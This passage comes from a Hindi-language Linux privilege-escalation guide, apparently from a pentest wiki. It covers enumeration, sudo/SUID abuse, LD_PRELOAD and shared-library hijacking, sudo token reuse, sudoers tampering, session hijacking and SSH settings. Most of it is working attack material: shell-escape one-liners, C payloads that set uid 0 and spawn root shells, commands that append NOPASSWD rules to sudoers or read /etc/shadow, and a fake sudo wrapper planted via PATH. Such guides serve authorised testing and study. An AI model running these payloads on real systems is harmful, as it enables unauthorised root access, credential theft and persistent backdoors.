यह सिस्टम बहुमुखी है, basic IPC को सपोर्ट करता है जो processes के बीच डेटा एक्सचेंज को बेहतर बनाता है, और यह **enhanced UNIX domain sockets** की याद दिलाता है। साथ ही, यह events या signals के प्रसारण में मदद करता है, जिससे system components के बीच सहज एकीकरण होता है। उदाहरण के लिए, आने वाली कॉल के बारे में Bluetooth daemon का एक signal music player को mute करने का संकेत दे सकता है, जिससे user experience बेहतर होता है। अतिरिक्त रूप से, D-Bus एक remote object सिस्टम का समर्थन करता है, जो applications के बीच service requests और method invocations को सरल बनाता है, जिससे परम्परागत रूप से जटिल प्रक्रियाएँ सुचारू हो जाती हैं।

D-Bus **allow/deny model** पर काम करता है, और matching policy rules के समेकित प्रभाव के आधार पर संदेश अनुमति (method calls, signal emissions, आदि) का प्रबंधन करता है। ये नीतियाँ bus के साथ इंटरैक्शन को निर्दिष्ट करती हैं, और इन permissions के दुरुपयोग के माध्यम से संभावित रूप से privilege escalation की अनुमति दे सकती हैं।

ऐसी एक पॉलिसी का उदाहरण `/etc/dbus-1/system.d/wpa_supplicant.conf` में दिया गया है, जो root user के लिए `fi.w1.wpa_supplicant1` का मालिक बनने, उसे संदेश भेजने और उससे संदेश प्राप्त करने की permissions का विवरण देता है।

यदि पॉलिसी में कोई विशिष्ट user या group निर्दिष्ट नहीं है तो वह सार्वभौमिक रूप से लागू होती है, जबकि "default" context पॉलिसियाँ उन सभी पर लागू होती हैं जो अन्य विशिष्ट नीतियों द्वारा कवर नहीं होते।
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**यहाँ सीखें कैसे D-Bus communication को enumerate और exploit करें:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **नेटवर्क**

नेटवर्क को enumerate करना और मशीन की स्थिति का पता लगाना हमेशा रोचक होता है।

### सामान्य enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

हमेशा उन नेटवर्क सेवाओं की जाँच करें जो मशीन पर चल रही हों और जिनसे आप उसे एक्सेस करने से पहले इंटरैक्ट नहीं कर पाए:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

जाँचें कि क्या आप sniff traffic कर सकते हैं। अगर कर सकते हैं, तो आप कुछ credentials प्राप्त कर सकते हैं।
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

जाँचें कि आप **who** हैं, आपके पास कौन से **privileges** हैं, सिस्टम में कौन से **users** हैं, कौन **login** कर सकता है और किनके पास **root privileges** हैं:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

कुछ Linux संस्करण एक बग से प्रभावित थे जो ऐसे उपयोगकर्ताओं (जिनका **UID > INT_MAX**) को उच्चाधिकार प्राप्त करने की अनुमति देता है। More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### समूह

जाँचें कि क्या आप **किसी समूह के सदस्य** हैं जो आपको root privileges दे सकता है:

{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### क्लिपबोर्ड

जाँचें कि क्लिपबोर्ड के अंदर (यदि संभव हो) कुछ रोचक तो नहीं है।
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### पासवर्ड नीति
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### ज्ञात पासवर्ड

यदि आप **किसी भी पासवर्ड को जानते हैं** तो उस पासवर्ड का उपयोग करके **प्रत्येक उपयोगकर्ता के रूप में लॉगिन करने का प्रयास करें**।

### Su Brute

अगर आपको बहुत शोर करने में आपत्ति नहीं है और `su` और `timeout` बाइनरीज़ कंप्यूटर पर मौजूद हैं, तो आप उपयोगकर्ता पर brute-force आज़माने के लिए [su-bruteforce](https://github.com/carlospolop/su-bruteforce) का उपयोग कर सकते हैं।\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parameter के साथ भी उपयोगकर्ताओं पर brute-force करने की कोशिश करता है।

## Writable PATH का दुरुपयोग

### $PATH

यदि आप पाते हैं कि आप $PATH के किसी फ़ोल्डर के अंदर **लिख सकते हैं** तो आप संभावित रूप से विशेषाधिकार वृद्धि कर सकते हैं, ऐसा करके कि आप writable फ़ोल्डर के अंदर किसी कमांड के नाम से एक backdoor **create** करें जो किसी अलग उपयोगकर्ता (आदर्श रूप से root) द्वारा execute किया जाएगा और जो उस फ़ोल्डर से पहले स्थित किसी फ़ोल्डर से load नहीं होता है जो आपके writable फ़ोल्डर से पहले $PATH में मौजूद है।

### SUDO and SUID

आपको कुछ कमांड sudo के ज़रिये execute करने की अनुमति दी जा सकती है या उनमें suid बिट सेट हो सकता है। इसे जाँचें:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
कुछ **अप्रत्याशित commands आपको फ़ाइलें पढ़ने और/या लिखने या यहाँ तक कि कोई command निष्पादित करने की अनुमति देते हैं।** उदाहरण के लिए:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo कॉन्फ़िगरेशन किसी user को बिना password जाने किसी command को दूसरे user के privileges के साथ execute करने की अनुमति दे सकता है।
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
इस उदाहरण में उपयोगकर्ता `demo` `root` के रूप में `vim` चला सकता है, और अब `root` डायरेक्टरी में एक ssh key जोड़कर या `sh` कॉल करके shell पाना बहुत आसान है।
```
sudo vim -c '!sh'
```
### SETENV

यह निर्देश उपयोगकर्ता को किसी कमांड को चलाते समय **set an environment variable** करने की अनुमति देता है:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
यह उदाहरण, **based on HTB machine Admirer**, **कमजोर** था **PYTHONPATH hijacking** के लिए, जिससे root के रूप में स्क्रिप्ट चलाते समय किसी arbitrary python library को लोड किया जा सकता था:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo निष्पादन बायपास करने वाले पथ

**Jump** का इस्तेमाल करके अन्य फ़ाइलें पढ़ें या **symlinks** का उपयोग करें। उदाहरण के लिए sudoers फ़ाइल में: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
यदि एक **wildcard** का उपयोग किया जाता है (\*), तो यह और भी आसान है:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**रोकथाम उपाय**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary जब command path निर्दिष्ट न किया गया हो

यदि **sudo permission** किसी एक command को **path निर्दिष्ट किए बिना** दिया गया हो: _hacker10 ALL= (root) less_ आप इसे PATH variable बदलकर exploit कर सकते हैं।
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
यह तकनीक उस स्थिति में भी इस्तेमाल की जा सकती है अगर एक **suid** बाइनरी **किसी अन्य कमांड को बिना पाथ बताये चलाती है (हमेशा _**strings**_ से किसी अजीब SUID बाइनरी की सामग्री की जाँच करें)**।

[Payload examples to execute.](payloads-to-execute.md)

### SUID बाइनरी जिसमें कमांड पाथ निर्दिष्ट है

अगर **suid** बाइनरी **पाथ निर्दिष्ट करते हुए किसी अन्य कमांड को चलाती है**, तो आप कोशिश कर सकते हैं कि उस कमांड के नाम से एक **export a function** बनाकर उसे export करें जिसे suid फ़ाइल कॉल कर रही है।

उदाहरण के लिए, अगर एक suid बाइनरी _**/usr/sbin/service apache2 start**_ को कॉल करती है तो आपको उस नाम का फ़ंक्शन बनाकर उसे export करने का प्रयास करना होगा:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
फिर, जब आप suid binary को कॉल करेंगे, यह फ़ंक्शन निष्पादित होगा

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** environment variable का उपयोग एक या अधिक shared libraries (.so फाइलें) को लोडर द्वारा बाकी सभी से पहले लोड करने के लिए किया जाता है, जिसमें standard C library (`libc.so`) भी शामिल है। इस प्रक्रिया को एक लाइब्रेरी को preload करना कहा जाता है।

हालाँकि, सिस्टम की सुरक्षा बनाए रखने और विशेष रूप से **suid/sgid** executables के साथ इस फीचर के दुरुपयोग को रोकने के लिए, सिस्टम कुछ शर्तें लागू करता है:

- लोडर उन executables के लिए **LD_PRELOAD** को नज़रअंदाज़ कर देता है जहाँ real user ID (_ruid_) effective user ID (_euid_) से मेल नहीं खाता।
- suid/sgid वाले executables के लिए, केवल वे लाइब्रेरियाँ preload की जाती हैं जो मानक पथों में मौजूद हों और जो स्वयं suid/sgid हों।

Privilege escalation हो सकती है यदि आपके पास `sudo` के साथ कमांड चलाने की क्षमता है और `sudo -l` के आउटपुट में **env_keep+=LD_PRELOAD** शामिल है। यह कॉन्फ़िगरेशन **LD_PRELOAD** environment variable को बने रहने और `sudo` के साथ कमांड चलाने पर भी मान्यता प्राप्त करने की अनुमति देता है, जो संभावित रूप से मनमाना कोड को elevated privileges के साथ निष्पादित करने का कारण बन सकता है।
```
Defaults        env_keep += LD_PRELOAD
```
इसे **/tmp/pe.c** के रूप में सेव करें
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
फिर **इसे compile करें** का उपयोग करके:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
अंत में, **escalate privileges** चलाते हुए
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> एक समान privesc का दुरुपयोग किया जा सकता है यदि हमलावर **LD_LIBRARY_PATH** env variable को नियंत्रित करता है क्योंकि वह उन पथों को नियंत्रित करता है जहाँ लाइब्रेरीज़ खोजी जाएँगी।
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

जब आपको किसी ऐसे बाइनरी के साथ सामना होता है जिसके पास **SUID** permissions हैं और जो असामान्य लगता है, तो यह एक अच्छा अभ्यास है यह सत्यापित करने का कि क्या वह सही ढंग से **.so** फ़ाइलें लोड कर रहा है। इसे निम्नलिखित कमांड चलाकर जाँचा जा सकता है:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
उदाहरण के लिए, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ जैसी त्रुटि मिलने पर यह संभावित exploitation का संकेत दे सकती है।

इसे exploit करने के लिए, एक C फ़ाइल बनाई जाएगी, जैसे _"/path/to/.config/libcalc.c"_, जिसमें निम्नलिखित कोड होगा:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
यह code, एक बार compiled और executed होने पर, file permissions को manipulate करके और elevated privileges के साथ एक shell execute करके privileges बढ़ाने का प्रयास करता है।

ऊपर दिए गए C file को shared object (.so) file में compile करने के लिए:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
अंत में, प्रभावित SUID binary को चलाने से exploit ट्रिगर होना चाहिए, जिससे संभावित system compromise की अनुमति मिल सकती है।

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
अब जब हमने एक SUID binary पाया है जो एक folder से एक library लोड कर रहा है जहाँ हम write कर सकते हैं, तो आइए उसी folder में आवश्यक name के साथ library बनाते हैं:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
यदि आपको निम्नलिखित जैसी कोई त्रुटि मिले:
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) एक curated list है Unix binaries का जिन्हें एक attacker local security restrictions bypass करने के लिए exploit कर सकता है। [**GTFOArgs**](https://gtfoargs.github.io/) वही है लेकिन उन मामलों के लिए जहाँ आप किसी command में **only inject arguments** कर सकते हैं।

The project legitimate functions of Unix binaries को इकट्ठा करता है जिन्हें abuse करके restricted shells से बाहर निकला जा सकता है, privileges escalate या maintain किए जा सकते हैं, files transfer किए जा सकते हैं, bind and reverse shells spawn किए जा सकते हैं, और अन्य post-exploitation tasks को आसान बनाया जा सकता है।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` आप tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) का उपयोग कर सकते हैं यह जांचने के लिए कि यह किसी sudo rule को exploit करने का तरीका ढूँढता है या नहीं।

### Reusing Sudo Tokens

In cases where you have **sudo access** but not the password, आप privileges escalate कर सकते हैं by **waiting for a sudo command execution and then hijacking the session token**.

Requirements to escalate privileges:

- आपके पास पहले से user "_sampleuser_" के रूप में एक shell होना चाहिए
- "_sampleuser_" ने **used `sudo`** किया हुआ होना चाहिए किसी चीज़ को execute करने के लिए **last 15mins** में (डिफ़ॉल्ट रूप से यही sudo token की अवधि है जो हमें बिना पासवर्ड के `sudo` इस्तेमाल करने की अनुमति देती है)
- `cat /proc/sys/kernel/yama/ptrace_scope` का मान 0 होना चाहिए
- `gdb` उपलब्ध होना चाहिए (आप इसे upload करने में सक्षम होंगे)

(आप अस्थायी रूप से `ptrace_scope` को `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` से सक्षम कर सकते हैं या स्थायी रूप से `/etc/sysctl.d/10-ptrace.conf` को संशोधित करके और `kernel.yama.ptrace_scope = 0` सेट करके)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- यह **दूसरा exploit** (`exploit_v2.sh`) _/tmp_ में एक sh shell बनाएगा जो **root के स्वामित्व में setuid के साथ** होगा
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- यह **third exploit** (`exploit_v3.sh`) एक **sudoers file बनाएगा**, जो **sudo tokens को अनंत बना देगा और सभी users को sudo इस्तेमाल करने की अनुमति देगा**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

यदि उस फ़ोल्डर में या फ़ोल्डर के भीतर बने किसी भी फ़ाइल पर आपकी **write permissions** हैं तो आप बाइनरी [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का उपयोग करके किसी **user और PID** के लिए **sudo token** बना सकते हैं.\
उदाहरण के लिए, यदि आप फ़ाइल _/var/run/sudo/ts/sampleuser_ को overwrite कर सकते हैं और उस user के रूप में आपकी एक shell है जिसका PID 1234 है, तो आप बिना password जाने **obtain sudo privileges** कर सकते हैं, ऐसा करके:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

फ़ाइल `/etc/sudoers` और `/etc/sudoers.d` के अंदर की फ़ाइलें यह कॉन्फ़िगर करती हैं कि कौन `sudo` का उपयोग कर सकता है और कैसे। ये फ़ाइलें **डिफ़ॉल्ट रूप से केवल user root और group root द्वारा पढ़ी जा सकती हैं**.\\
**यदि** आप इस फ़ाइल को **पढ़** सकते हैं तो आप कुछ रोचक जानकारी **प्राप्त** कर पाएंगे, और यदि आप किसी भी फ़ाइल को **लिख** सकते हैं तो आप **escalate privileges** करने में सक्षम होंगे।
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
अगर आप लिख सकते हैं तो आप इस अनुमति का दुरुपयोग कर सकते हैं
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
इन अनुमतियों का दुरुपयोग करने का एक और तरीका:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` बाइनरी के कुछ विकल्प हैं, जैसे OpenBSD के लिए `doas` — इसकी कॉन्फ़िगरेशन `/etc/doas.conf` पर जांचना न भूलें।
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

यदि आप जानते हैं कि कोई **user आमतौर पर किसी machine से जुड़ता है और `sudo` का उपयोग करके privileges बढ़ाता है** और आपने उस user context में shell हासिल कर लिया है, तो आप **एक नया sudo executable बना सकते हैं** जो पहले आपका कोड root के रूप में चलाएगा और फिर user का command। फिर user context का **$PATH** संशोधित करें (उदाहरण के लिए नई path को `.bash_profile` में जोड़कर) ताकि जब user `sudo` चलाए तो आपका sudo executable execute हो।

ध्यान दें कि यदि user किसी अलग shell (not `bash`) का उपयोग करता है तो आपको नई path जोड़ने के लिए अन्य files संशोधित करनी पड़ेंगी। उदाहरण के लिए [ sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` को संशोधित करता है। आप एक और उदाहरण [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) में पा सकते हैं।

या कुछ इस तरह चलाकर:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## साझा लाइब्रेरी

### ld.so

The file `/etc/ld.so.conf` indicates **जहाँ से लोड की गई configuration फाइलें आ रही हैं**। Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`

That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. This configuration files **अन्य फ़ोल्डरों की ओर इशारा करती हैं** जहाँ **लाइब्रेरीज़** को **खोजा जाएगा**। For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **This means that the system will search for libraries inside `/usr/local/lib`**.

If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
Take a look at **how to exploit this misconfiguration** in the following page:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib को `/var/tmp/flag15/` में कॉपी करने पर, इसे `RPATH` वेरिएबल में निर्दिष्ट इस स्थान पर प्रोग्राम द्वारा उपयोग किया जाएगा।
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
फिर `/var/tmp` में `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` के साथ एक evil library बनाएं
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## क्षमताएँ

Linux capabilities किसी process को उपलब्ध **root privileges का उपसमूह** प्रदान करते हैं। यह प्रभावी रूप से root **privileges को छोटे और विशिष्ट इकाइयों में विभाजित कर देता है**। इन इकाइयों में से प्रत्येक को स्वतंत्र रूप से processes को दिया जा सकता है। इस तरह पूरे privileges का सेट कम हो जाता है, जिससे exploitation के जोखिम घटते हैं।\
निम्न पृष्ठ पढ़ें ताकि आप **capabilities और उन्हें कैसे दुरुपयोग किया जा सकता है** के बारे में अधिक जान सकें:


{{#ref}}
linux-capabilities.md
{{#endref}}

## डायरेक्टरी अनुमतियाँ

एक डायरेक्टरी में, **"execute" के लिए बिट** दर्शाता है कि प्रभावित उपयोगकर्ता फ़ोल्डर में "**cd**" कर सकता है।\
**"read"** बिट का अर्थ है कि उपयोगकर्ता फ़ाइलों को **list** कर सकता है, और **"write"** बिट का अर्थ है कि उपयोगकर्ता फ़ाइलें **delete** और नई फ़ाइलें **create** कर सकता है।

## ACLs

Access Control Lists (ACLs) डिस्क्रेशनरी permissions की द्वितीयक परत का प्रतिनिधित्व करते हैं, जो पारंपरिक ugo/rwx permissions को **override** करने में सक्षम हैं। ये permissions उन विशिष्ट उपयोगकर्ताओं को अधिकार देने या अस्वीकार करने के द्वारा फ़ाइल या डायरेक्टरी एक्सेस पर नियंत्रण को बढ़ाते हैं जो मालिक नहीं हैं या समूह का हिस्सा नहीं हैं। यह स्तर की **granularity अधिक सटीक access management सुनिश्चित करती है**। Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**प्रदान करें** user "kali" को किसी फ़ाइल पर read और write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**सिस्टम से विशिष्ट ACLs वाली फ़ाइलें प्राप्त करें:**
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## shell सत्र खोलना

**पुराने संस्करण** में आप किसी अन्य उपयोगकर्ता (**root**) के कुछ **shell** सत्रों को **hijack** कर सकते हैं.\
**नवीनतम संस्करण** में आप केवल **अपने स्वयं के उपयोगकर्ता** के screen सत्रों से ही **कनेक्ट** कर पाएँगे। हालाँकि, आप **सत्र के अंदर दिलचस्प जानकारी** पा सकते हैं।

### screen सत्र hijacking

**screen सत्रों की सूची**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**सत्र से जुड़ें**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

यह समस्या **old tmux versions** में थी। मैं non-privileged user के रूप में root द्वारा बनाए गए tmux (v2.1) session को hijack नहीं कर पाया।

**tmux sessions की सूची**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**सत्र से जुड़ें**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Debian आधारित सिस्टम्स (Ubuntu, Kubuntu, आदि) पर सितंबर 2006 और 13 मई 2008 के बीच जनरेट हुए सभी SSL और SSH keys इस बग से प्रभावित हो सकते हैं.\
यह बग उन OS में नया ssh key बनाते समय होता है, क्योंकि **केवल 32,768 संभावनाएँ संभव थीं**। इसका मतलब है कि सभी संभावनाएँ गणना की जा सकती हैं और **ssh public key होने पर आप संबंधित private key खोज सकते हैं**। आप गणना की गई संभावनाएँ यहाँ पा सकते हैं: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** यह बताता है कि password authentication की अनुमति है या नहीं। डिफ़ॉल्ट `no` है।
- **PubkeyAuthentication:** यह बताता है कि public key authentication की अनुमति है या नहीं। डिफ़ॉल्ट `yes` है।
- **PermitEmptyPasswords**: जब password authentication की अनुमति हो, यह बताता है कि सर्वर खाली password strings वाले अकाउंट्स में लॉगिन की अनुमति देता है या नहीं। डिफ़ॉल्ट `no` है।

### PermitRootLogin

यह बताता है कि root ssh के माध्यम से लॉगिन कर सकता है या नहीं, डिफ़ॉल्ट `no` है। संभावित मान:

- `yes`: root पासवर्ड और private key दोनों का उपयोग करके लॉगिन कर सकता है
- `without-password` or `prohibit-password`: root केवल private key के साथ लॉगिन कर सकता है
- `forced-commands-only`: Root केवल private key का उपयोग करके और तभी लॉगिन कर सकता है यदि commands विकल्प specified हों
- `no` : नहीं

### AuthorizedKeysFile

यह उन फाइलों को निर्दिष्ट करता है जिनमें वे public keys होते हैं जिन्हें user authentication के लिए उपयोग किया जा सकता है। इसमें `%h` जैसे tokens हो सकते हैं, जिन्हें home directory से replace किया जाएगा। **आप absolute paths निर्दिष्ट कर सकते हैं** (जो `/` से शुरू होते हैं) या **user के home से relative paths**। For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding आपको **use your local SSH keys instead of leaving keys** (without passphrases!) sitting on your server की अनुमति देता है। इसलिए, आप **jump** via ssh **to a host** कर पाएंगे और वहां से **jump to another** host **using** the **key** located in your **initial host** कर सकेंगे।

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
ध्यान दें कि यदि `Host` `*` है तो हर बार जब उपयोगकर्ता किसी अलग मशीन पर जाता है, वह होस्ट keys तक पहुँच पाएगा (जो कि एक सुरक्षा समस्या है)।

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

यदि आप पाते हैं कि Forward Agent किसी environment में configured है तो निम्न पृष्ठ पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## रोचक फ़ाइलें

### Profiles फ़ाइलें

